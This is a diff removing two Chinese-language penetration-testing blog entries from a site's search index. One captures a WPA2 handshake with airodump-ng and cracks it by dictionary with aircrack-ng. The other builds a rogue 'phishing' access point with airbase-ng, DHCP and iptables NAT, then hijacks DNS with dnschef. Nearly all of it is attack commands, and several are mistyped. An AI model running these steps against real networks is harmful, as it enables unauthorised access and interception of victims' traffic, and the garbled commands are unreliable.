-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rfkill list</span><br><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773459364973](2026/03/16/WIFI HACK/1773459364973.png)</p>
-<p>搜集不到信号，重启虚拟机，断开网卡后重新连接</p>
-<p>![1773459441435](2026/03/16/WIFI HACK/1773459441435.png)</p>
-<p>查看进程并杀掉进程</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airmon-ng check</span><br><span class="line">airmon-ng check kill</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773461780462](2026/03/16/WIFI HACK/1773461780462.png)</p>
-<p>重新监听附近 wifi</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773485885291](2026/03/16/WIFI HACK/1773485885291.png)</p>
-<p>监听被破解的 Wifi</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng -c 目标的CH值 -w WPA2-Crack --bssid 目标的mac地址 wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>后续有设备连接该 wifi 后，获得 cap 包，后续通过以下命令进行密码爆破，是否爆破成功与字典有关</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">aircrack-ng -b 目标的mac地址 -w 字典位置 获取的cap包</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>渗透技术</category>
-      </categories>
-      <tags>
-        <tag>WIFI</tag>
-        <tag>密码爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>WIFI 钓鱼</title>
-    <url>/2026/03/16/WiFi%20fish/</url>
-    <content><![CDATA[<p>安装 dhcp 服务并创建 leases 文件</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y isc-dhcp-server</span><br><span class="line">touch /var/lib/dhcp/dhcpd.leases</span><br><span class="line">chmod 777 /var/lib/dhcp/dhcpd.leases</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773486325024](2026/03/16/WiFi fish/1773486325024.png)</p>
-<p>修改 dhcpd.conf 配置文件</p>
-<p>![1773486758230](2026/03/16/WiFi fish/1773486758230.png)</p>
-<p>连接无线网卡</p>
-<p>![1773486815899](2026/03/16/WiFi fish/1773486815899.png)</p>
-<p>关闭网卡</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifoncif wlan0 down</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773486961940](2026/03/16/WiFi fish/1773486961940.png)</p>
-<p>设置监听模式后开启网卡</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">iwconfig wlan0 mode monitor</span><br><span class="line">ifconfig wlan0 up</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773487079485](2026/03/16/WiFi fish/1773487079485.png)</p>
-<p>通过 airbase-ng 建立无线热点</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airbase-ng -e WIFI名称 -c 信道 wlan0</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773487285071](2026/03/16/WiFi fish/1773487285071.png)</p>
-<p>设置 at0 地址和网关，添加路由，并将虚拟机作为转发机器</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig at0 10.0.0.1 net netmask 255.255.255.0</span><br><span class="line">route add -net 10.0.0.0 mask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773626582028](2026/03/16/WiFi fish/1773626582028.png)</p>
-<p>启动服务后配置规则</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/isc-dhcp-server start</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/25 -j TCPMSS --set-mss 1356</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773627837594](2026/03/16/WiFi fish/1773627837594.png)</p>
-<p>连接钓鱼的无线网络</p>
-<p>![1773627930611](2026/03/16/WiFi fish/1773627930611.png)</p>
-<p>进行 DNS 劫持</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#nameserver设置的是其他未被劫持的网站发送给Google的公共DNS服务器8.8.8.8/53查询结果</span><br><span class="line">dnschef --fakedomains-被劫持的网站 --fakeip-10.0.0.1 -i 10.0.0.1 --namesever 8.8.8.8#53</span><br></pre></td></tr></tbody></table></figure>
-
-<p>![1773628341119](2026/03/16/WiFi fish/1773628341119.png)</p>
-]]></content>
-      <categories>
-        <category>渗透技术</category>
-      </categories>
-      <tags>
-        <tag>WIFI</tag>
-        <tag>DNS劫持</tag>
+        <tag>Spring</tag>
       </tags>
   </entry>
 </search>
